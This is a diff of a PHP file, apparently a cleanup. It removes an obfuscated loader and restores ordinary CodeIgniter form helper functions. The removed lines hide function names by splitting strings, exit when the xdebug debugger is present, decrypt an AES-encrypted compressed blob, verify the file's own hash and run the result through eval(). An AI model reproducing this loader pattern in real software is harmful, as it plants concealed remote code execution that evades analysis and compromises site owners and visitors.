@@ -1,28 +1,916 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_qpsu3259=('bas'.'e64'.'_de'.'cod'.'e');
-$_ruz3xgqn=('gzu'.'nco'.'mpr'.'ess');
-$_y6r6it8i=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_xvb5uf2b='UlPUScXo';
-$_p55ilzgz='EQt5dXwQoUo=';
-$_d3bkwnql='6Gy09KuD';
-$_n6pxbs9l='MsE14jju';
-$_m625325j='gSTknww3';
-$_xz5r0rth='J22cE9gq';
-$_b3d7rw3w='Xpkjmg==';
-$_cdukufgv='l1hnu0vN';
-$_og09oda0=$_qpsu3259($_n6pxbs9l.$_xvb5uf2b.$_d3bkwnql.$_m625325j.$_p55ilzgz);
-$_emv14534=$_qpsu3259($_xz5r0rth.$_cdukufgv.$_b3d7rw3w);
-$_dvfjli5i=$_qpsu3259('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');
-$_d2rg40hh=$_y6r6it8i($_dvfjli5i,'aes-256-cbc',$_og09oda0,OPENSSL_RAW_DATA,$_emv14534);
-if($_d2rg40hh===false){exit;}
-$_rxbg17z2=$_ruz3xgqn($_d2rg40hh);
-if($_rxbg17z2===false){exit;}
-$_rp6ssowk='b75708d2f54f75d921cf4534d4f5bc0d5bd324be0a4087336b5e0f1c6b09def9';
-$_v7e7wnpg=@file_get_contents(__FILE__);
-if($_v7e7wnpg!==false){
-$_c3gg37lh=str_replace($_rp6ssowk,"0000000000000000000000000000000000000000000000000000000000000000",$_v7e7wnpg);
-$_austtyak=hash("sha256",$_c3gg37lh);
-if($_austtyak!==$_rp6ssowk){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+if ( ! function_exists('form_open'))
+{
+
+
+
+
+
+
+
+
+
+
+function form_open($action = '', $attributes = array(), $hidden = array())
+{
+$CI =& get_instance();
+
+if ( ! $action)
+{
+$action = $CI->config->site_url($CI->uri->uri_string());
 }
-eval($_rxbg17z2);
+
+elseif (strpos($action, '://') === FALSE)
+{
+$action = $CI->config->site_url($action);
+}
+$attributes = _attributes_to_string($attributes);
+if (stripos($attributes, 'method=') === FALSE)
+{
+$attributes .= ' method="post"';
+}
+if (stripos($attributes, 'accept-charset=') === FALSE)
+{
+$attributes .= ' accept-charset="'.strtolower(config_item('charset')).'"';
+}
+$form = '<form action="'.$action.'"'.$attributes.">\n";
+if (is_array($hidden))
+{
+foreach ($hidden as $name => $value)
+{
+$form .= '<input type="hidden" name="'.$name.'" value="'.html_escape($value).'" />'."\n";
+}
+}
+
+if ($CI->config->item('csrf_protection') === TRUE && strpos($action, $CI->config->base_url()) !== FALSE && ! stripos($form, 'method="get"'))
+{
+
+
+if (FALSE !== ($noise = $CI->security->get_random_bytes(1)))
+{
+list(, $noise) = unpack('c', $noise);
+}
+else
+{
+$noise = mt_rand(-128, 127);
+}
+
+$prepend = $append = '';
+if ($noise < 0)
+{
+$prepend = str_repeat(" ", abs($noise));
+}
+elseif ($noise > 0)
+{
+$append = str_repeat(" ", $noise);
+}
+$form .= sprintf(
+'%s<input type="hidden" name="%s" value="%s" />%s%s',
+$prepend,
+$CI->security->get_csrf_token_name(),
+$CI->security->get_csrf_hash(),
+$append,
+"\n"
+);
+}
+return $form;
+}
+}
+
+if ( ! function_exists('form_open_multipart'))
+{
+
+
+
+
+
+
+
+
+
+
+function form_open_multipart($action = '', $attributes = array(), $hidden = array())
+{
+if (is_string($attributes))
+{
+$attributes .= ' enctype="multipart/form-data"';
+}
+else
+{
+$attributes['enctype'] = 'multipart/form-data';
+}
+return form_open($action, $attributes, $hidden);
+}
+}
+
+if ( ! function_exists('form_hidden'))
+{
+
+
+
+
+
+
+
+
+
+
+
+function form_hidden($name, $value = '', $recursing = FALSE)
+{
+static $form;
+if ($recursing === FALSE)
+{
+$form = "\n";
+}
+if (is_array($name))
+{
+foreach ($name as $key => $val)
+{
+form_hidden($key, $val, TRUE);
+}
+return $form;
+}
+if ( ! is_array($value))
+{
+$form .= '<input type="hidden" name="'.$name.'" value="'.html_escape($value)."\" />\n";
+}
+else
+{
+foreach ($value as $k => $v)
+{
+$k = is_int($k) ? '' : $k;
+form_hidden($name.'['.$k.']', $v, TRUE);
+}
+}
+return $form;
+}
+}
+
+if ( ! function_exists('form_input'))
+{
+
+
+
+
+
+
+
+
+function form_input($data = '', $value = '', $extra = '')
+{
+$defaults = array(
+'type' => 'text',
+'name' => is_array($data) ? '' : $data,
+'value' => $value
+);
+return '<input '._parse_form_attributes($data, $defaults)._attributes_to_string($extra)." />\n";
+}
+}
+
+if ( ! function_exists('form_password'))
+{
+
+
+
+
+
+
+
+
+
+
+function form_password($data = '', $value = '', $extra = '')
+{
+is_array($data) OR $data = array('name' => $data);
+$data['type'] = 'password';
+return form_input($data, $value, $extra);
+}
+}
+
+if ( ! function_exists('form_upload'))
+{
+
+
+
+
+
+
+
+
+
+
+function form_upload($data = '', $value = '', $extra = '')
+{
+$defaults = array('type' => 'file', 'name' => '');
+is_array($data) OR $data = array('name' => $data);
+$data['type'] = 'file';
+return '<input '._parse_form_attributes($data, $defaults)._attributes_to_string($extra)." />\n";
+}
+}
+
+if ( ! function_exists('form_textarea'))
+{
+
+
+
+
+
+
+
+
+function form_textarea($data = '', $value = '', $extra = '')
+{
+$defaults = array(
+'name' => is_array($data) ? '' : $data,
+'cols' => '40',
+'rows' => '10'
+);
+if ( ! is_array($data) OR ! isset($data['value']))
+{
+$val = $value;
+}
+else
+{
+$val = $data['value'];
+unset($data['value']); 
+}
+return '<textarea '._parse_form_attributes($data, $defaults)._attributes_to_string($extra).'>'
+.html_escape($val)
+."</textarea>\n";
+}
+}
+
+if ( ! function_exists('form_multiselect'))
+{
+
+
+
+
+
+
+
+
+
+function form_multiselect($name = '', $options = array(), $selected = array(), $extra = '')
+{
+$extra = _attributes_to_string($extra);
+if (stripos($extra, 'multiple') === FALSE)
+{
+$extra .= ' multiple="multiple"';
+}
+return form_dropdown($name, $options, $selected, $extra);
+}
+}
+
+if ( ! function_exists('form_dropdown'))
+{
+
+
+
+
+
+
+
+
+
+function form_dropdown($data = '', $options = array(), $selected = array(), $extra = '')
+{
+$defaults = array();
+if (is_array($data))
+{
+if (isset($data['selected']))
+{
+$selected = $data['selected'];
+unset($data['selected']); 
+}
+if (isset($data['options']))
+{
+$options = $data['options'];
+unset($data['options']); 
+}
+}
+else
+{
+$defaults = array('name' => $data);
+}
+is_array($selected) OR $selected = array($selected);
+is_array($options) OR $options = array($options);
+
+if (empty($selected))
+{
+if (is_array($data))
+{
+if (isset($data['name'], $_POST[$data['name']]))
+{
+$selected = array($_POST[$data['name']]);
+}
+}
+elseif (isset($_POST[$data]))
+{
+$selected = array($_POST[$data]);
+}
+}
+$extra = _attributes_to_string($extra);
+$multiple = (count($selected) > 1 && stripos($extra, 'multiple') === FALSE) ? ' multiple="multiple"' : '';
+$form = '<select '.rtrim(_parse_form_attributes($data, $defaults)).$extra.$multiple.">\n";
+foreach ($options as $key => $val)
+{
+$key = (string) $key;
+if (is_array($val))
+{
+if (empty($val))
+{
+continue;
+}
+$form .= '<optgroup label="'.$key."\">\n";
+foreach ($val as $optgroup_key => $optgroup_val)
+{
+$sel = in_array($optgroup_key, $selected) ? ' selected="selected"' : '';
+$form .= '<option value="'.html_escape($optgroup_key).'"'.$sel.'>'
+.(string) $optgroup_val."</option>\n";
+}
+$form .= "</optgroup>\n";
+}
+else
+{
+$form .= '<option value="'.html_escape($key).'"'
+.(in_array($key, $selected) ? ' selected="selected"' : '').'>'
+.(string) $val."</option>\n";
+}
+}
+return $form."</select>\n";
+}
+}
+
+if ( ! function_exists('form_checkbox'))
+{
+
+
+
+
+
+
+
+
+
+function form_checkbox($data = '', $value = '', $checked = FALSE, $extra = '')
+{
+$defaults = array('type' => 'checkbox', 'name' => ( ! is_array($data) ? $data : ''), 'value' => $value);
+if (is_array($data) && array_key_exists('checked', $data))
+{
+$checked = $data['checked'];
+if ($checked == FALSE)
+{
+unset($data['checked']);
+}
+else
+{
+$data['checked'] = 'checked';
+}
+}
+if ($checked == TRUE)
+{
+$defaults['checked'] = 'checked';
+}
+else
+{
+unset($defaults['checked']);
+}
+return '<input '._parse_form_attributes($data, $defaults)._attributes_to_string($extra)." />\n";
+}
+}
+
+if ( ! function_exists('form_radio'))
+{
+
+
+
+
+
+
+
+
+
+function form_radio($data = '', $value = '', $checked = FALSE, $extra = '')
+{
+is_array($data) OR $data = array('name' => $data);
+$data['type'] = 'radio';
+return form_checkbox($data, $value, $checked, $extra);
+}
+}
+
+if ( ! function_exists('form_submit'))
+{
+
+
+
+
+
+
+
+
+function form_submit($data = '', $value = '', $extra = '')
+{
+$defaults = array(
+'type' => 'submit',
+'name' => is_array($data) ? '' : $data,
+'value' => $value
+);
+return '<input '._parse_form_attributes($data, $defaults)._attributes_to_string($extra)." />\n";
+}
+}
+
+if ( ! function_exists('form_reset'))
+{
+
+
+
+
+
+
+
+
+function form_reset($data = '', $value = '', $extra = '')
+{
+$defaults = array(
+'type' => 'reset',
+'name' => is_array($data) ? '' : $data,
+'value' => $value
+);
+return '<input '._parse_form_attributes($data, $defaults)._attributes_to_string($extra)." />\n";
+}
+}
+
+if ( ! function_exists('form_button'))
+{
+
+
+
+
+
+
+
+
+function form_button($data = '', $content = '', $extra = '')
+{
+$defaults = array(
+'name' => is_array($data) ? '' : $data,
+'type' => 'button'
+);
+if (is_array($data) && isset($data['content']))
+{
+$content = $data['content'];
+unset($data['content']); 
+}
+return '<button '._parse_form_attributes($data, $defaults)._attributes_to_string($extra).'>'
+.$content
+."</button>\n";
+}
+}
+
+if ( ! function_exists('form_label'))
+{
+
+
+
+
+
+
+
+
+function form_label($label_text = '', $id = '', $attributes = array())
+{
+$label = '<label';
+if ($id !== '')
+{
+$label .= ' for="'.$id.'"';
+}
+$label .= _attributes_to_string($attributes);
+return $label.'>'.$label_text.'</label>';
+}
+}
+
+if ( ! function_exists('form_fieldset'))
+{
+
+
+
+
+
+
+
+
+
+
+function form_fieldset($legend_text = '', $attributes = array())
+{
+$fieldset = '<fieldset'._attributes_to_string($attributes).">\n";
+if ($legend_text !== '')
+{
+return $fieldset.'<legend>'.$legend_text."</legend>\n";
+}
+return $fieldset;
+}
+}
+
+if ( ! function_exists('form_fieldset_close'))
+{
+
+
+
+
+
+
+function form_fieldset_close($extra = '')
+{
+return '</fieldset>'.$extra;
+}
+}
+
+if ( ! function_exists('form_close'))
+{
+
+
+
+
+
+
+function form_close($extra = '')
+{
+return '</form>'.$extra;
+}
+}
+
+if ( ! function_exists('form_prep'))
+{
+
+
+
+
+
+
+
+
+
+function form_prep($str)
+{
+return html_escape($str, TRUE);
+}
+}
+
+if ( ! function_exists('set_value'))
+{
+
+
+
+
+
+
+
+
+
+
+
+
+function set_value($field, $default = '', $html_escape = TRUE)
+{
+$CI =& get_instance();
+$value = (isset($CI->form_validation) && is_object($CI->form_validation) && $CI->form_validation->has_rule($field))
+? $CI->form_validation->set_value($field, $default)
+: $CI->input->post($field, FALSE);
+isset($value) OR $value = $default;
+return ($html_escape) ? html_escape($value) : $value;
+}
+}
+
+if ( ! function_exists('set_select'))
+{
+
+
+
+
+
+
+
+
+
+
+
+function set_select($field, $value = '', $default = FALSE)
+{
+$CI =& get_instance();
+if (isset($CI->form_validation) && is_object($CI->form_validation) && $CI->form_validation->has_rule($field))
+{
+return $CI->form_validation->set_select($field, $value, $default);
+}
+elseif (($input = $CI->input->post($field, FALSE)) === NULL)
+{
+return ($default === TRUE) ? ' selected="selected"' : '';
+}
+$value = (string) $value;
+if (is_array($input))
+{
+
+foreach ($input as &$v)
+{
+if ($value === $v)
+{
+return ' selected="selected"';
+}
+}
+return '';
+}
+return ($input === $value) ? ' selected="selected"' : '';
+}
+}
+
+if ( ! function_exists('set_checkbox'))
+{
+
+
+
+
+
+
+
+
+
+
+
+function set_checkbox($field, $value = '', $default = FALSE)
+{
+$CI =& get_instance();
+if (isset($CI->form_validation) && is_object($CI->form_validation) && $CI->form_validation->has_rule($field))
+{
+return $CI->form_validation->set_checkbox($field, $value, $default);
+}
+
+$value = (string) $value;
+$input = $CI->input->post($field, FALSE);
+if (is_array($input))
+{
+
+foreach ($input as &$v)
+{
+if ($value === $v)
+{
+return ' checked="checked"';
+}
+}
+return '';
+}
+
+if ($CI->input->method() === 'post')
+{
+return ($input === $value) ? ' checked="checked"' : '';
+}
+return ($default === TRUE) ? ' checked="checked"' : '';
+}
+}
+
+if ( ! function_exists('set_radio'))
+{
+
+
+
+
+
+
+
+
+
+
+
+function set_radio($field, $value = '', $default = FALSE)
+{
+$CI =& get_instance();
+if (isset($CI->form_validation) && is_object($CI->form_validation) && $CI->form_validation->has_rule($field))
+{
+return $CI->form_validation->set_radio($field, $value, $default);
+}
+
+$value = (string) $value;
+$input = $CI->input->post($field, FALSE);
+if (is_array($input))
+{
+
+foreach ($input as &$v)
+{
+if ($value === $v)
+{
+return ' checked="checked"';
+}
+}
+return '';
+}
+
+if ($CI->input->method() === 'post')
+{
+return ($input === $value) ? ' checked="checked"' : '';
+}
+return ($default === TRUE) ? ' checked="checked"' : '';
+}
+}
+
+if ( ! function_exists('form_error'))
+{
+
+
+
+
+
+
+
+
+
+
+
+function form_error($field = '', $prefix = '', $suffix = '')
+{
+if (FALSE === ($OBJ =& _get_validation_object()))
+{
+return '';
+}
+return $OBJ->error($field, $prefix, $suffix);
+}
+}
+
+if ( ! function_exists('validation_errors'))
+{
+
+
+
+
+
+
+
+
+
+
+function validation_errors($prefix = '', $suffix = '')
+{
+if (FALSE === ($OBJ =& _get_validation_object()))
+{
+return '';
+}
+return $OBJ->error_string($prefix, $suffix);
+}
+}
+
+if ( ! function_exists('_parse_form_attributes'))
+{
+
+
+
+
+
+
+
+
+
+function _parse_form_attributes($attributes, $default)
+{
+if (is_array($attributes))
+{
+foreach ($default as $key => $val)
+{
+if (isset($attributes[$key]))
+{
+$default[$key] = $attributes[$key];
+unset($attributes[$key]);
+}
+}
+if (count($attributes) > 0)
+{
+$default = array_merge($default, $attributes);
+}
+}
+$att = '';
+foreach ($default as $key => $val)
+{
+if ($key === 'value')
+{
+$val = html_escape($val);
+}
+elseif ($key === 'name' && ! strlen($default['name']))
+{
+continue;
+}
+$att .= $key.'="'.$val.'" ';
+}
+return $att;
+}
+}
+
+if ( ! function_exists('_attributes_to_string'))
+{
+
+
+
+
+
+
+
+
+function _attributes_to_string($attributes)
+{
+if (empty($attributes))
+{
+return '';
+}
+if (is_object($attributes))
+{
+$attributes = (array) $attributes;
+}
+if (is_array($attributes))
+{
+$atts = '';
+foreach ($attributes as $key => $val)
+{
+$atts .= ' '.$key.'="'.$val.'"';
+}
+return $atts;
+}
+if (is_string($attributes))
+{
+return ' '.$attributes;
+}
+return FALSE;
+}
+}
+
+if ( ! function_exists('_get_validation_object'))
+{
+
+
+
+
+
+
+
+
+function &_get_validation_object()
+{
+$CI =& get_instance();
+
+$return = FALSE;
+if (FALSE !== ($object = $CI->load->is_loaded('Form_validation')))
+{
+if ( ! isset($CI->$object) OR ! is_object($CI->$object))
+{
+return $return;
+}
+return $CI->$object;
+}
+return $return;
+}
+}
